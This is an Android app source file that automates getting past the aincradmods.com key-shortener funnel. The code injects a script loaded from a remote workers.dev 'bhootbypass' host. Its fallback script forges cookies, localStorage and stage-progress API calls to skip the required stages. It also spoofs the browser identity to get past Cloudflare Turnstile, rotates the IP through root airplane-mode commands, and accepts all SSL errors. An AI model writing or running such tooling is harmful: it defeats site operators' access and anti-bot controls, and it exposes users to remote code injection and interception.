package com.rabindra.aincrad;

import android.annotation.SuppressLint;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.net.http.SslError;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebStorage;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.webkit.WebSettingsCompat;
import androidx.webkit.WebViewFeature;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Collections;

public class MainActivity extends AppCompatActivity {

    private WebView webView;
    private ProgressBar progressBar;
    private TextView tvStatus;
    private Button btnAirplane;
    private Button btnRunScript;
    private Button btnReload;

    // Pure Dark Black Screen elements
    private LinearLayout pureBlackOverlay;
    private TextView tvBlackBadge;
    private TextView tvCountdownSeconds;
    private TextView tvCountdownLabel;
    private TextView tvBlackInfo;
    private Button btnSkipTimer;

    private PowerManager.WakeLock wakeLock;
    private CountDownTimer countDownTimer;
    private boolean isWaitingNinetySeconds = false;
    private boolean hasHandledStageOne = false;
    private String lastStageOneUrl = "";

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Handler pollerHandler = new Handler(Looper.getMainLooper());

    private static final String DEFAULT_URL = "https://aincradmods.com/getkey";

    // User's requested script
    private static final String SCRIPT_BHOOT = 
        "javascript:(function(){" +
        "var s=document.createElement('script');" +
        "s.src='https://bhootbypass.redbhoot505.workers.dev/?host='+encodeURIComponent(location.hostname);" +
        "document.body.appendChild(s);" +
        "})();";

    // Standalone direct bypass fallback logic (runs if worker is blocked by CSP/network)
    private static final String FALLBACK_DIRECT_BYPASS = 
        "(function(){\n" +
        "    if (window.__fallback_ran) return;\n" +
        "    window.__fallback_ran = true;\n" +
        "    var l = window.location;\n" +
        "    if (l.hostname.indexOf('aincradmods.com') !== -1) {\n" +
        "        var c = document.querySelector('code');\n" +
        "        if (c && c.textContent.trim()) {\n" +
        "            if (window.AndroidBridge && window.AndroidBridge.onKeyDetected) {\n" +
        "                window.AndroidBridge.onKeyDetected(c.textContent.trim());\n" +
        "            }\n" +
        "            return;\n" +
        "        }\n" +
        "        var b = document.querySelector('button[data-slot=\"button\"]');\n" +
        "        if (b) { b.click(); return; }\n" +
        "    }\n" +
        "    fetch('/api/session-info', {credentials: 'include'})\n" +
        "        .then(function(r){ return r.json(); })\n" +
        "        .then(function(s){\n" +
        "            if (!s || !s.hasSession || !s.sessionToken) return;\n" +
        "            document.cookie = 'stp=2; path=' + l.pathname + '; max-age=86400';\n" +
        "            localStorage.setItem('et_', String(Date.now() - 1000));\n" +
        "            localStorage.setItem('fs_countdown', '0');\n" +
        "            var nextP = Number(s.stageNumber) + 1;\n" +
        "            var finalP = Number(s.totalStage) + 1;\n" +
        "            var targetP = (nextP < finalP) ? finalP : nextP;\n" +
        "            var inp = {'0': {'json': {'token': s.sessionToken, 'progress': targetP, 'stageId': s.stageId || 0}}};\n" +
        "            fetch('/api/trpc/linkSession.nextStage?batch=1&input=' + encodeURIComponent(JSON.stringify(inp)), {credentials: 'include'})\n" +
        "                .then(function(r){ return r.text(); })\n" +
        "                .then(function(txt){\n" +
        "                    try {\n" +
        "                        var lines = txt.split('\\n');\n" +
        "                        for (var i = 0; i < lines.length; i++) {\n" +
        "                            var ln = lines[i].trim();\n" +
        "                            if (!ln) continue;\n" +
        "                            var p = JSON.parse(ln);\n" +
        "                            var d = p[0] && p[0].result && p[0].result.data && p[0].result.data.json ? p[0].result.data.json : null;\n" +
        "                            if (d && d.destinationLink) { l.href = d.destinationLink; return; }\n" +
        "                            if (d && d.url) { l.href = d.url + '?t=' + encodeURIComponent(s.sessionUrlToken || s.sessionToken) + '&i=' + targetP; return; }\n" +
        "                        }\n" +
        "                    } catch(e) {}\n" +
        "                }).catch(function(){});\n" +
        "        }).catch(function(){});\n" +
        "})();";

    // Detection script injected periodically
    private static final String DETECTION_SCRIPT = 
        "(function(){\n" +
        "    if (window.__stage1Reported) return;\n" +
        "    var curHost = (location.hostname || '').toLowerCase();\n" +
        "    var curPath = (location.pathname || '').toLowerCase();\n" +
        "    if (curHost.indexOf('cloudflare.com') !== -1 || curPath.indexOf('/cdn-cgi/') !== -1) return;\n" +
        "\n" +
        "    // Check 1: fixed top banner <div class=\"fixed right-0 top-0 ...\">1/6</div>\n" +
        "    var topDiv = document.querySelector('div.fixed.right-0.top-0');\n" +
        "    if (topDiv && topDiv.textContent && topDiv.textContent.indexOf('1/6') !== -1) {\n" +
        "        window.__stage1Reported = true;\n" +
        "        if (window.AndroidBridge && window.AndroidBridge.onStageOneDetected) {\n" +
        "            window.AndroidBridge.onStageOneDetected();\n" +
        "        }\n" +
        "        return;\n" +
        "    }\n" +
        "\n" +
        "    // Check 2: exact text '1/6' or '1 / 6' in headings or divisions\n" +
        "    var divs = document.querySelectorAll('div, span, p, h1, h2, h3, h4');\n" +
        "    for (var i = 0; i < divs.length; i++) {\n" +
        "        var txt = (divs[i].textContent || '').trim();\n" +
        "        if (txt === '1/6' || txt === '1 / 6' || txt === 'Etapa 1/6' || txt === 'Stage 1/6') {\n" +
        "            window.__stage1Reported = true;\n" +
        "            if (window.AndroidBridge && window.AndroidBridge.onStageOneDetected) {\n" +
        "                window.AndroidBridge.onStageOneDetected();\n" +
        "            }\n" +
        "            return;\n" +
        "        }\n" +
        "    }\n" +
        "\n" +
        "    // Check 3: on aincradmods.com, check if key is already displayed in <code>\n" +
        "    if (curHost.indexOf('aincradmods.com') !== -1) {\n" +
        "        var codeEl = document.querySelector('code');\n" +
        "        if (codeEl && codeEl.textContent.trim().length > 3) {\n" +
        "            if (window.AndroidBridge && window.AndroidBridge.onKeyDetected) {\n" +
        "                window.AndroidBridge.onKeyDetected(codeEl.textContent.trim());\n" +
        "            }\n" +
        "        }\n" +
        "    }\n" +
        "})();";

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        setupWakeLock();
        setupWebView();
        setupListeners();

        // Load starting URL
        loadDefaultUrl();

        // Start DOM detection poller
        startDetectionPoller();
    }

    private void initViews() {
        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progress_bar);
        tvStatus = findViewById(R.id.tv_status);
        btnAirplane = findViewById(R.id.btn_airplane);
        btnRunScript = findViewById(R.id.btn_run_script);
        btnReload = findViewById(R.id.btn_reload);

        pureBlackOverlay = findViewById(R.id.pure_black_overlay);
        tvBlackBadge = findViewById(R.id.tv_black_badge);
        tvCountdownSeconds = findViewById(R.id.tv_countdown_seconds);
        tvCountdownLabel = findViewById(R.id.tv_countdown_label);
        tvBlackInfo = findViewById(R.id.tv_black_info);
        btnSkipTimer = findViewById(R.id.btn_skip_timer);
    }

    private void setupWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE, "Aincrad:KeepAwake");
                wakeLock.acquire(120 * 60 * 1000L); // 2 hours
            }
        } catch (Exception ignored) {}
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setSupportMultipleWindows(true);
        settings.setJavaScriptCanOpenWindowsAutomatically(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        // Standalone Chrome User-Agent
        String defaultUa = settings.getUserAgentString();
        String cleanUa = defaultUa.replace("; wv", "").replace("Version/4.0 ", "");
        settings.setUserAgentString(cleanUa);

        // Suppress X-Requested-With header to ensure Cloudflare Turnstile passes cleanly
        if (WebViewFeature.isFeatureSupported(WebViewFeature.REQUESTED_WITH_HEADER_ALLOW_LIST)) {
            WebSettingsCompat.setRequestedWithHeaderOriginAllowList(settings, Collections.emptySet());
        }

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (newProgress < 100) {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(newProgress);
                } else {
                    progressBar.setVisibility(View.GONE);
                }
            }
        });

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                // Block intrusive rogue ad domains
                if (isAdNetwork(url)) {
                    return true;
                }
                return false;
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                updateStatusFromUrl(url);

                // If navigating to a fresh page that is not the same as stage 1, allow new detection
                if (!url.equals(lastStageOneUrl) && !isWaitingNinetySeconds) {
                    hasHandledStageOne = false;
                }
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                updateStatusFromUrl(url);

                // Immediately run detection script
                view.evaluateJavascript(DETECTION_SCRIPT, null);
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }
        });
    }

    private void setupListeners() {
        btnAirplane.setOnClickListener(v -> performRootAirplaneToggle());

        btnRunScript.setOnClickListener(v -> {
            Toast.makeText(this, "⚡ Triggering script manually...", Toast.LENGTH_SHORT).show();
            executeBypassScript();
        });

        btnReload.setOnClickListener(v -> {
            cancelCountdown();
            hasHandledStageOne = false;
            pureBlackOverlay.setVisibility(View.GONE);
            loadDefaultUrl();
        });

        btnSkipTimer.setOnClickListener(v -> {
            Toast.makeText(this, "⚡ Skipping countdown -> Executing script!", Toast.LENGTH_SHORT).show();
            cancelCountdown();
            executeBypassScript();
        });
    }

    private void loadDefaultUrl() {
        tvStatus.setText("Loading Aincrad...");
        webView.loadUrl(DEFAULT_URL);
    }

    private void updateStatusFromUrl(String url) {
        if (url == null) return;
        if (isWaitingNinetySeconds) return;

        if (url.contains("aincradmods.com")) {
            tvStatus.setText("Aincrad: Starting Key Gen");
        } else if (url.contains("milbviral.com") || url.contains("reserva-de-emergencia")) {
            tvStatus.setText("On Shortener Funnel");
        } else {
            try {
                URL u = new URL(url);
                tvStatus.setText(u.getHost());
            } catch (Exception e) {
                tvStatus.setText("Navigating...");
            }
        }
    }

    private boolean isAdNetwork(String url) {
        if (url == null) return false;
        String l = url.toLowerCase();
        return l.contains("omg10.com") || l.contains("popads") || l.contains("adsterra") 
            || l.contains("bet365") || l.contains("1xbet") || l.contains("trafficjunky");
    }

    // Poller to detect 1/6 continuously
    private void startDetectionPoller() {
        pollerHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isWaitingNinetySeconds && !hasHandledStageOne && webView != null) {
                    webView.evaluateJavascript(DETECTION_SCRIPT, null);
                }
                pollerHandler.postDelayed(this, 800);
            }
        }, 1000);
    }

    /**
     * Triggered when 1/6 is detected on screen!
     */
    public void onStageOneDetected() {
        mainHandler.post(() -> {
            if (isWaitingNinetySeconds || hasHandledStageOne) return;

            hasHandledStageOne = true;
            isWaitingNinetySeconds = true;
            lastStageOneUrl = webView.getUrl() != null ? webView.getUrl() : "";

            // Show pure dark black screen
            pureBlackOverlay.setVisibility(View.VISIBLE);
            tvBlackBadge.setText("● STAGE 1/6 DETECTED");
            tvCountdownSeconds.setText("90");
            tvCountdownLabel.setText("SECONDS REMAINING");
            tvBlackInfo.setText("Pure dark screen active.\nBypass script will run automatically in 90 seconds.");
            tvStatus.setText("1/6 DETECTED — 90s COUNTDOWN");

            Toast.makeText(MainActivity.this, "🎯 Stage 1/6 Detected! 90s Dark Timer Started.", Toast.LENGTH_LONG).show();

            // Start 90-second countdown (90,000 ms)
            startNinetySecondCountdown();
        });
    }

    private void startNinetySecondCountdown() {
        cancelCountdown();

        countDownTimer = new CountDownTimer(90000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                long sec = (millisUntilFinished + 999) / 1000;
                tvCountdownSeconds.setText(String.valueOf(sec));
                tvStatus.setText("Stage 1/6: " + sec + "s remaining");
            }

            @Override
            public void onFinish() {
                tvCountdownSeconds.setText("0");
                tvBlackBadge.setText("● 90s FINISHED — EXECUTING SCRIPT");
                tvBlackInfo.setText("Injecting bhootbypass automation...");
                tvStatus.setText("Executing script...");

                executeBypassScript();
            }
        }.start();
    }

    private void cancelCountdown() {
        if (countDownTimer != null) {
            countDownTimer.cancel();
            countDownTimer = null;
        }
        isWaitingNinetySeconds = false;
    }

    /**
     * Executes the requested bypass script, with a 3s fallback if worker fails.
     */
    private void executeBypassScript() {
        tvStatus.setText("Script Injected");

        // 1. Run primary script (user provided)
        webView.evaluateJavascript(SCRIPT_BHOOT, null);

        // 2. Schedule direct backup execution after 3 seconds in case workers.dev had network/CSP issues
        mainHandler.postDelayed(() -> {
            webView.evaluateJavascript(FALLBACK_DIRECT_BYPASS, null);
        }, 3000);

        // 3. Keep black screen for 2.5 seconds to show execution status, then smoothly hide it
        mainHandler.postDelayed(() -> {
            pureBlackOverlay.setVisibility(View.GONE);
            isWaitingNinetySeconds = false;
            tvStatus.setText("Automation Running...");
        }, 2500);
    }

    /**
     * Root 4G Airplane Toggle:
     * Disables and enables cellular connectivity for Indian 4G carrier IP rotation.
     */
    private void performRootAirplaneToggle() {
        tvStatus.setText("✈️ Rotating 4G IP...");
        btnAirplane.setEnabled(false);

        new Thread(() -> {
            try {
                Process p = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(p.getOutputStream());
                os.writeBytes("cmd connectivity airplane-mode enable\n");
                os.flush();
                Thread.sleep(3000);
                os.writeBytes("cmd connectivity airplane-mode disable\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                p.waitFor();
                Thread.sleep(4000); // Wait for carrier signal lock

                // Fetch new public IP
                String newIp = fetchCurrentIp();
                mainHandler.post(() -> {
                    btnAirplane.setEnabled(true);
                    tvStatus.setText(newIp != null ? "IP: " + newIp : "IP Rotated");
                    Toast.makeText(MainActivity.this, "✅ New IP: " + (newIp != null ? newIp : "Rotated"), Toast.LENGTH_SHORT).show();
                });
            } catch (Exception e) {
                mainHandler.post(() -> {
                    btnAirplane.setEnabled(true);
                    tvStatus.setText("Root error");
                    Toast.makeText(MainActivity.this, "Root command failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }

    private String fetchCurrentIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(4000);
            conn.setReadTimeout(4000);
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String ip = in.readLine();
            in.close();
            return ip;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * JavaScript Bridge interface called from DOM scripts.
     */
    public class AndroidBridge {

        @JavascriptInterface
        public void onStageOneDetected() {
            MainActivity.this.onStageOneDetected();
        }

        @JavascriptInterface
        public void onKeyDetected(String key) {
            mainHandler.post(() -> {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("Aincrad Key", key);
                if (clipboard != null) {
                    clipboard.setPrimaryClip(clip);
                }
                tvStatus.setText("Key: " + key);
                Toast.makeText(MainActivity.this, "🔑 Key Copied: " + key, Toast.LENGTH_LONG).show();
            });
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        cancelCountdown();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }
}
